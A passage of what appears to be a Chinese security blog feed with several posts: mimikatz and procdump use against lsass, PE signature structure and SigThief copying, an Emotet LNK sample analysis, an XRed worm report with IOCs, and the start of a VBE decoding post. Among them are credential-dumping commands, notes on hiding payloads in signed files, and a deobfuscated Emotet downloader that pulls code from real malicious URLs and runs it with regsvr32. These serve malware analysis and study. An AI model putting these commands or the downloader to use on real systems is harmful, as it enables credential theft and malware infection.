href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软官方的应用程序，文件本身不会被查杀</p><p>但测试过程中执行相应命令，Microsoft Defender报毒</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE103254-16533604085481.png" alt="屏幕截图103254"></p><p>所以之后还要重点考虑<strong>mimikatz的免杀策略</strong>，网上有很多相应的文章</p><p>采用Procdump获取内存文件lsass.exe进程 (它用于本地安全和登陆策略) 中存储的登录密码并转储到lsass.dmp文件中，之后我们就可以使用mimikatz去读取lsass.dmp获取到密码</p><p>生成转储文件lsass.dmp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><img src="屏幕截图103347.png" alt="屏幕截图103347" style="zoom: 80%;" /><p>mimikatz读取转储文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure><img src="屏幕截图103717.png" alt="屏幕截图103717" style="zoom:80%;" /><p>然后就可以解码得到的SHA1值</p><p>工具很强大不搞渗透简单了解一下算了</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件数字签名</title>
    <link href="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <url>/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="PE文件数字签名及验证过程"><a href="#PE文件数字签名及验证过程" class="headerlink" title="PE文件数字签名及验证过程"></a>PE文件数字签名及验证过程</h3><p>签名：</p><ul><li>软件发布者使用散列算法（如MD5或SHA）计算PE文件的散列值。</li><li>软件发布者使用私钥对散列值进行签名得到签名数据。</li><li>将签名私钥对应的公钥和签名数据等以证书的形式附加在PE文件之中，形成经过数字签名的PE文件。</li><li>软件发布者将经过数字签名的PE文件进行发布。</li></ul><p>验证：</p><ul><li>从PE文件证书中提取软件发布者的公钥、使用的散列算法、签名算法、原始散列值的签名数据。</li><li>使用提取的公钥和对应签名验证算法将签名数据还原为原始PE文件的原始散列值。</li><li>对现有PE文件使用同样的散列算法计算出对应的散列值。</li><li>对比两个散列值是否一致，从而判断数据是否被破坏和篡改。</li></ul><p>部分系统文件会包含微软的签名，例如C:\Windows\explorer.exe，在文件的属性中可以看到</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220519142715621.png" alt="image-20220519142715621"></p><p>也可以通过PowerShell的<strong>Get-AuthenticodeSignature</strong>命令看到</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220519142953496.png" alt="image-20220519142953496"></p><h3 id="PE文件格式和数字签名格式"><a href="#PE文件格式和数字签名格式" class="headerlink" title="PE文件格式和数字签名格式"></a>PE文件格式和数字签名格式</h3><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/v2-a23de788976665ae5b7599bd26771dbd_r.jpg" alt="preview"></p><p>使用CFF Explorer查看文件结构</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE153059.png" alt="屏幕截图"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">File Size: 5114880 bytes<br>PE Size: 5060608 bytes<br></code></pre></td></tr></table></figure><p>可知</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">Certificate Table的偏移地址为004D3800(5060608)<br>Certificate Table的前四字节保存长度，大小应该为0000D400（5114880-5060608=54272）<br></code></pre></td></tr></table></figure><p>如下图，PE头中的安全表(Certificate Table）信息</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE152504.png" alt="屏幕截图"></p><p>Certificate Table内容</p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1652.png" alt="屏幕截图"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WIN_CERTIFICATE</span> &#123;<br>  DWORD dwLength;        <span class="hljs-comment">//指定属性证书条目的长度</span><br>  WORD wRevision;        <span class="hljs-comment">//包含证书版本号</span><br>  WORD wCertificateType;        <span class="hljs-comment">//指定 bCertificate 中内容类型</span><br>  BYTE bCertificate[];          <span class="hljs-comment">//包含证书，例如验证码签名</span><br>&#125; WIN_CERTIFICATE, *LPWIN_CERTIFICATE;<br></code></pre></td></tr></table></figure><p>详见<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-attribute-certificate-table-image-only">https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-attribute-certificate-table-image-only</a></p><p><img src="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220520104829178.png" alt="image-20220520104829178"></p><p>可以看到explorer.exe的bCertificate内容类型为0x0002,即证书内容 PKCS#7 <strong>SignedData</strong> 结构( 微软官方文档：<a href="https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx">Windows Authenticode Portable Executable Signature Format </a>)</p><p>bCertificate（证书内容）从Certificate Table的偏移地址+8开始，格式是ASN.1,可以通过<strong>ASN1View</strong>进行查看</p><img src="image-20220520105811145.png" alt="image-20220520105811145" style="zoom:80%;" /><p>要注意的是，在Certificate Table的尾部添加数据并不会影响计算出的文件hash，也就是说在Certificate Table尾部添加数据不会导致证书失效，所以可以在数字证书中隐藏Payload。</p><h3 id="数字签名的盗用和复制"><a href="#数字签名的盗用和复制" class="headerlink" title="数字签名的盗用和复制"></a>数字签名的盗用和复制</h3><p><a href="https://github.com/secretsquirrel/SigThief">SigThief</a>可自动实现保存复制Certificate Table</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sigthief.<span class="hljs-keyword">py</span> -i C:\Windows\explorer.<span class="hljs-keyword">exe</span> -t test.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><img src="image-20220519154725489.png" alt="image-20220519154725489" style="zoom: 80%;" /><p>但是文件hash已经改变，所以证书无法通过验证，显示无效</p><p>有一种通过验证的方法是<a href="https://docs.microsoft.com/zh-cn/archive/blogs/eduardonavarro/sips-subject-interface-package-and-authenticode">SIP</a>劫持，通过修改注册表中调用的证书验证方法，默认返回TRUE来使程序通过验证。详见参考链接1</p><p>反正我没成功 &#x3D; &#x3D;！</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/30157991?from_voters_page=true">https://zhuanlan.zhihu.com/p/30157991?from_voters_page=true</a></p><p><a href="https://zhuanlan.zhihu.com/p/23512363">https://zhuanlan.zhihu.com/p/23512363</a></p><p><a href="https://blog.csdn.net/Eastmount/article/details/113774264">https://blog.csdn.net/Eastmount/article/details/113774264</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字签名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Emotet的新形式-Link</title>
    <link href="/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/"/>
    <url>/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/</url>
    
    <content type="html"><![CDATA[<p>今天发现Emotet出现了新的攻击方式</p><p>第一次接触Emotet是采用的常见的Office宏病毒，然后升级到后来的宏4.0，现在又出现了新的攻击方式——利用LInk文件进行攻击。</p><p>搜集到的样本包括Link文件生成VBS和PowerShell两种，以生成VBS文件为例。</p><p><strong>文件名：Datos-2504.lnk</strong></p><p><strong>MD5: 95e0286c6c38320d9673b6492f9e2284</strong></p><img src="image-20220517144528337.png" alt="image-20220517144528337" style="zoom:67%;" /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">C:\Windows\system32\cmd.exe <span class="hljs-regexp">/v:on /</span>c findstr <span class="hljs-string">&quot;glKmfOKnQLYKnNs.*&quot;</span> <span class="hljs-string">&quot;Datos-2504.lnk&quot;</span>                                                                                                                         &gt; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span> &amp; <span class="hljs-string">&quot;%tmp%\YlScZcZKeP.vbs&quot;</span><br></code></pre></td></tr></table></figure><p>启动CMD调用findstr在文件内搜索以”glKmfOKnQLYKnNs.*”开头的字符串保存到”%tmp%\YlScZcZKeP.vbs”下，并执行。</p><p>Link文件本身包含VBS脚本。</p><img src="image-20220517145225085.png" alt="image-20220517145225085" style="zoom: 67%;" /><p>生成的YlScZcZKeP.vbs经过混淆。</p><img src="image-20220517145700961.png" alt="image-20220517145700961" style="zoom:80%;" /><p>通过手工和WScript.StdOut.WriteLine方法去混淆得到可读代码。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">on</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br><span class="hljs-keyword">Set</span> FSO = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><br><span class="hljs-keyword">Function</span> Base64Decode(<span class="hljs-keyword">ByVal</span> vCode)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.DOMDocument.3.0&quot;</span>).CreateElement(<span class="hljs-string">&quot;base64&quot;</span>)<br>        .dataType = <span class="hljs-string">&quot;bin.base64&quot;</span><br>        .text = vCode<br>        Base64Decode = Stream_BinaryTo<span class="hljs-built_in">String</span>(.nodeTypedValue)<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Function</span> Stream_BinaryTo<span class="hljs-built_in">String</span>(Binary)<br>    <span class="hljs-keyword">With</span> <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>        .Type = <span class="hljs-number">1</span><br>        .Open<br>        .Write Binary<br>        .Position = <span class="hljs-number">0</span><br>        .Type = <span class="hljs-number">2</span><br>        .CharSet = <span class="hljs-string">&quot;utf-8&quot;</span><br>        Stream_BinaryToString = .ReadText<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Dim</span> LmPxinnpsd(<span class="hljs-number">6</span>)<br><br><br>LmPxinnpsd(<span class="hljs-number">0</span>) = <span class="hljs-string">&quot;https://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">1</span>) = <span class="hljs-string">&quot;http://filmmogzivota.rs/SpryAssets/gDR/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">2</span>) = <span class="hljs-string">&quot;http://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">3</span>) = <span class="hljs-string">&quot;http://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">4</span>) = <span class="hljs-string">&quot;http://cipro.mx/prensa/siZP69rBFmibDvuTP1L/&quot;</span><br><br>LmPxinnpsd(<span class="hljs-number">5</span>) = <span class="hljs-string">&quot;http://colegiounamuno.es/cgi-bin/E/&quot;</span><br><br><br><span class="hljs-keyword">Execute</span>(<span class="hljs-string">&quot;dIm xml,Ws,Db,FiLePaTH,uRL</span><br><span class="hljs-string">xml = &quot;</span>MSXml2.SeRVERXmlhtTp<span class="hljs-number">.3</span><span class="hljs-number">.0</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">Ws = &quot;</span>wscRipT.SHEll<span class="hljs-string">&quot;</span><br><span class="hljs-string">Db = &quot;</span>aDodb.STReam<span class="hljs-string">&quot;</span><br><span class="hljs-string">seT ImSHdnYdVR = CreAteOBjecT(ws)</span><br><span class="hljs-string">TmP = imsHdnydvR.EXpANdeNvIroNmEnTSTrIngS(&quot;</span>%tmp%<span class="hljs-string">&quot;)</span><br><span class="hljs-string">wiNDiR = iMshDnYdvR.ExPAndenviroNmEnTstRiNgs(&quot;</span>%wInDiR%<span class="hljs-string">&quot;) </span><br><span class="hljs-string"></span><br><span class="hljs-string">FilEPATH = tMp &amp; &quot;</span>\KzcEXkekpr.Zvp<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">CaLl prog</span><br><span class="hljs-string"> SUb PROG</span><br><span class="hljs-string">    ranDOmize</span><br><span class="hljs-string">    INDeX = iNT((5 - 0 + 1)*rnD + 0)</span><br><span class="hljs-string">    DiM msXML</span><br><span class="hljs-string">seT mSxML = CreateOBJEcT(xmL)</span><br><span class="hljs-string">    dIM STreAM</span><br><span class="hljs-string">sEt stream = crEaTEOBjECT(DB)</span><br><span class="hljs-string">    MsxML.oPEN &quot;</span><span class="hljs-keyword">GEt</span><span class="hljs-string">&quot;, BasE64Decode(lmPxInNpsd(iNdEX)), FAlse</span><br><span class="hljs-string">msXML.sETReQueStheadEr &quot;</span>uSer-AgeNT<span class="hljs-string">&quot;, &quot;</span>vBKbaQgjyvRRbcgfvlsc<span class="hljs-string">&quot;</span><br><span class="hljs-string">msxML.SEnd</span><br><span class="hljs-string">    wiTH stream</span><br><span class="hljs-string">.TYPe = 1</span><br><span class="hljs-string">.OpEN</span><br><span class="hljs-string">.write MsXMl.rEspoNsEBody</span><br><span class="hljs-string">.savetOfIlE fILEPATH, 2</span><br><span class="hljs-string">    end WitH</span><br><span class="hljs-string"> end Sub&quot;</span>)<br><br>ImshDnydVr.Exec(windir &amp; <span class="hljs-string">&quot;\sySTem32\regsVR32.Exe &quot;</span> &amp; tmp &amp; Base64Decode(<span class="hljs-string">&quot;XEtaY0VYa0VrcFIuWlZQ&quot;</span>))<br>FSO.GetFile(WScript.ScriptFullName).delete<br></code></pre></td></tr></table></figure><p>和之前的VBA宏病毒样本一样都是从多个地址下载远控木马，然后通过regsvr32执行。</p><p><strong>参考：</strong></p><p><a href="https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/">https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/</a></p><p><a href="https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/">https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/</a></p><p>对Link文件病毒感兴趣的可以参考这篇文章：</p><p><a href="https://bbs.pediy.com/thread-260953.htm">https://bbs.pediy.com/thread-260953.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Emotet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XRed蠕虫病毒分析</title>
    <link href="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><p>恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：</p><table><thead><tr><th>文件名</th><th>000000.xlsm</th></tr></thead><tbody><tr><td>MD5</td><td>e566fc53051035e1e6fd0ed1823de0f9</td></tr><tr><td>SHA256</td><td>8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bbfb731424d7952c15</td></tr><tr><td>文件大小</td><td>18,387 字节</td></tr><tr><td>病毒类型</td><td>HEUR:Trojan-Downloader.Script.Generic</td></tr></tbody></table><p>经初步分析该文档属于伪装成“Synaptics触摸板驱动程序”的Xred蠕虫病毒产生的存在恶意宏代码的Excel传播文档。该病毒曾于2020年初较为活跃，是具备远程控制、信息窃取能力的感染型病毒，可以感染本地EXE文件及xlsx电子表格文件，病毒可通过文件分享和U盘、移动硬盘等媒介传播。据此，安全人员判定上述上传恶意文件的主机已经遭受感染，但在流量监控过程中并未发现该病毒主程序，因此从相关威胁情报中搜集到了源EXE格式病毒。Xred病毒详情如下：</p><table><thead><tr><th>文件名</th><th>Synaptics.exe</th></tr></thead><tbody><tr><td>MD5</td><td>13358cfb6040fd4b2dba262f209464de</td></tr><tr><td>SHA256</td><td>72daa031ce52468fce5cdab85b21b18f1211b8804bc23c6e6ae8c24e868c4866</td></tr><tr><td>文件大小</td><td>771,584 字节</td></tr><tr><td>病毒类型</td><td>Backdoor.Win32.DarkKomet.hqxy</td></tr></tbody></table><h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>捕获的Excel文档内容均为空，包含恶意宏代码，打开后会自动运行。篡改Word和Excel组件的宏设置，启用所有宏，并通过公有云盘下载并执行Synaptics.exe病毒。目前所有的下载链接均已失效。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png" alt="img"></p><center>修改宏设置</center><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png" alt="img"></p><center>远程下载并执行病毒</center><p>Xred病毒由Delph编写，无壳，自身伪装成Synaptics触摸板驱动程序。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png" alt="img"></p><center>PE详情</center><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png" alt="img"></p><center>伪装成驱动程序</center><p>该病毒通过感染指定位置（Desktop、Documents、Downloads）的32位的“.exe”后缀文件与“.xlsx”后缀文件，使其恶意代码可以通过文件共享大量传播但不会导致系统明显卡顿。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png" alt="img"></p><center>指定位置</center><p>被感染的文件被执行时，会执行恶意逻辑，包括释放伪装名为“Synaptics.exe”的文件常驻系统，进行远程控制，回传窃取的敏感信息等恶意行为。主要功能逻辑如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png" alt="https://pc1.gtimg.com/guanjia/images/9b/83/9b837e056017f499ccb79ef4daa6213d.png"></p><center>主要功能逻辑</center><p>被感染的可执行文件体积增量约为753KB，包含一个名为“EXERESX”的资源，该资源是原始正常的程序。“EXERESX”资源会在宿主文件运行时被释放到当前目录并设置隐藏属性后执行。添加“ ._cache_”前缀拼接文件名。如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png" alt="img"></p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png" alt="img"></p><center>被感染的文件与原文件对比</center><p>该病毒释放并加载名为“KBHKS”的动态库资源，通过设置相关钩子消息以记录键盘输入信息及其窗口信息等， Hook代码关键逻辑如下：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png" alt="img"></p><center>Hook钩子</center><p>病毒使用“XLSM”资源感染xlsx后缀文件，并将“.xlsx”后缀改为“.xlsm”。修改office组件设置以及xlsm后缀目的为了能够自动静默启用宏。如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png" alt="img"></p><center>感染xlsx文件</center><p>病毒回连地址，公有云盘下载地址及敏感信息接收邮箱见下图：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png" alt="img"> <center>回连字符串</center></p><p>具有基础的远程控制功能，包括执行CMD命令、屏幕截图、打印目录、下载文件、删除文件等。功能代码如下图所示。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png" alt="img"></p><center>远控功能</center><h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5：</strong></p><p>e566fc53051035e1e6fd0ed1823de0f9</p><p>13358cfb6040fd4b2dba262f209464de</p><p>备注：因为被感染文件一直都是变化的，MD5值不确定，只列举了两个得到的样本</p><p><strong>C2 &amp; URL：</strong></p><p>xred.mooo.com</p><p>freedns.afraid.org</p><p>docs.google.com&#x2F;uc?id&#x3D;0BxsMXGfPIZfSVlVsOGlEVGxuZVk&amp;export&#x3D;download</p><p><a href="http://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1">www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1</a></p><p>xred.site50.net&#x2F;syn&#x2F;Synaptics.rar</p><p><strong>邮箱地址：</strong></p><p><a href="mailto:&#x78;&#x72;&#101;&#100;&#x6c;&#x69;&#x6e;&#101;&#x31;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x78;&#x72;&#101;&#100;&#x6c;&#x69;&#x6e;&#101;&#x31;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a></p><p><a href="mailto:&#x78;&#114;&#101;&#x64;&#108;&#x69;&#110;&#x65;&#50;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#x78;&#114;&#101;&#x64;&#108;&#x69;&#110;&#x65;&#50;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></p><p><a href="mailto:&#120;&#x72;&#101;&#100;&#108;&#105;&#x6e;&#x65;&#x33;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#120;&#x72;&#101;&#100;&#108;&#105;&#x6e;&#x65;&#x33;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a></p><h2 id="四、处置建议"><a href="#四、处置建议" class="headerlink" title="四、处置建议"></a>四、处置建议</h2><p>（1）立即对感染病毒的机器进行断网处理，避免进一步扩散。</p><p>（2）对已感染病毒的电脑，进行全盘查杀，修复被感染的文件。</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XRed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VBE、VBS、PowerShell和JavaScript木马</title>
    <link href="/2022/05/13/VBE%E3%80%81VBS%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/"/>
    <url>/2022/05/13/VBE%E3%80%81VBS%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="VBE"><a href="#VBE" class="headerlink" title="VBE"></a>VBE</h2><p>VBE是编译后（加密）的VBS代码。</p><p>加密工具有很多，其中常用的是<strong>Microsoft Script Encoder(screnc.exe)</strong>,此外还有许多。</p><p>可以利用Microsoft Script Encoder进行解码，但是微软官网已经下架了相关下载链接。</p><p>推荐使用国外大神写的解码工具</p><p><a href="https://www.interclasse.com/scripts/decovbe.php">https://www.interclasse.com/scripts/decovbe.php</a></p><p>CMD执行decoder.vbs  (目标vbe)</p><p>例如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">decoder<span class="hljs-selector-class">.vbs</span> information.vbe<br></code></pre></td></tr></table></figure><p>information.vbe（MD5: E9FFDB716AF3D355B25096A8ED4DE8EF）</p><p>结果：</p><img src="image-20220512112831779.png" alt="image-20220512112831779" style="zoom: 50%;" /><p>因为源码写的是弹窗，不能复制。进行了修改（从第63行到第68行），在CMD执行路径下生成1.txt。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 